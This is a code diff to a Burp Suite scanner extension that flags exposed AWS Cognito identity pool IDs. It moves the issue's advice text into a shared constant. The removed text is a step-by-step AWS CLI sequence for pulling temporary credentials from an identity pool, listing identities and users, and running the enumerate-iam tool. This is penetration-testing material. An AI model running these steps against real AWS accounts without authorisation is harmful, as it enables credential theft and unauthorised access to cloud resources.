@@ -153,27 +153,7 @@ public class ClientPoolIdentityIDScanner extends MyScanner {
                                 baseRequestResponse.url(),
                                 AuditIssueSeverity.INFORMATION,
                                 AuditIssueConfidence.CERTAIN,
-                                """
-                                        <p>Try:</p>
-                                        <ul>
-                                        <li>omit regions with:<code>export AWS_DEFAULT_REGION="regionhere"</code>. Otherwise include <code>--region regionhere</code></li>
-                                        <li><code>export AWS_IDENTITY_POOL_ID="identitypoolidhere"</code>. Otherwise include <code>--region regionhere</code></li>
-                                        <li><code>aws cognito-identity get-id --identity-pool-id $AWS_IDENTITY_POOL_ID </code></li>
-                                        <li>Produces an IdentityId (use below): <code>aws cognito-identity get-id --identity-pool-id $AWS_IDENTITY_POOL_ID --logins cognito-idp.$AWS_DEFAULT_REGION.amazonaws.com/issuerfromidtokenhere=idtokenvaluehere</code></li>
-                                        <li><code>export AWS_IDENTITY_ID="valuefromabove"</code>
-                                        <li>Produces SessionToken, SecretKey, SecretKey: <code>aws cognito-identity get-credentials-for-identity --identity-id $AWS_IDENTITY_ID --logins cognito-idp.$AWS_DEFAULT_REGION.amazonaws.com/issuerfromidtokenhere=idtokenvalueherefrominitauthresponse</code></li>
-                                        <li>Set Values:<code>export AWS_ACCESS_KEY_ID=...'export AWS_SECRET_ACCESS_KEY=...;export AWS_SESSION_TOKEN=...</li>
-                                        <li><code>aws cognito-identity describe-identity --identity-id $AWS_IDENTITY_ID</code></li>
-                                        <li><code>aws cognito-identity describe-identity-pool --identity-pool-id $AWS_IDENTITY_POOL_ID</code></li>
-                                        <li><code>aws cognito-identity list-identity-pools --max-results 100</code></li>
-                                        <li><code>aws cognito-identity list-identities --identity-pool-id $AWS_IDENTITY_POOL_ID --max-results 100</code></li>
-                                        <li><code>aws cognito-idp list-users --user-pool-id $AWS_IDENTITY_POOL_ID</code></li>
-                                        <li><code>aws cognito-idp admin-list-devices --username test1 --user-pool-id $AWS_IDENTITY_POOL_ID</code></li>
-                                        <li>Basic Flow Enabled? <code>aws cognito-identity get-open-id-token --identity-id $AWS_IDENTITY_ID --no-sign</code> and <code>aws sts assume-role-with-web-identity --role-arn <role_arn> --role-session-name sessionname --web-identity-token <token> --no-sign</code></li>
-                                        <li><code>git clone https://github.com/andresriancho/enumerate-iam.git</code>, also see https://github.com/andresriancho/enumerate-iam/pull/15/commits/77ad5b41216e3b5f1511d0c385da8cd5984c2d3c to prevent it from getting stuck, then <code>./enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY --session-token $AWS_SESSION_TOKEN --region $AWS_DEFAULT_REGION</code>          
-                                        </ul>
-                                        <p>Reference: https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_Operations.html</p>
-                                                                    """,
+                                CognitoShared.EXPLOIT_DESCRIPTION,
                                 null,
                                 null,
                                 baseRequestResponse);
